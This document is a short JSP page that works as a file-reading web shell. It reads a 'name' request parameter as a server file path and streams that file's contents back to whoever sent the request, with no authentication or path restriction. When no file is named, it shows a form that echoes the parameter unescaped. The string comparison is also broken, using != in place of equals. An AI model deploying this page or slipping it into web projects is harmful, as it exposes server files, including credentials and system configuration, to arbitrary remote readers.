<%@ page import="java.io.*" %>
<%
	String name = request.getParameter("name");
	response.setContentType("text/plain");
	if (name != null && name != "") {
		InputStream is = new FileInputStream(new File(name));
		byte[] buf = new byte[10240];
		int c =is.read(buf);
		while (c >= 0) {
			out.write(new String(buf, 0, c));
			c =is.read(buf);
		}
	} else {
%>
<form>
	Name: <input name="name" size="100" value="<%= name %>" />
	<input type="submit" />
</form>
<%
	}
%>
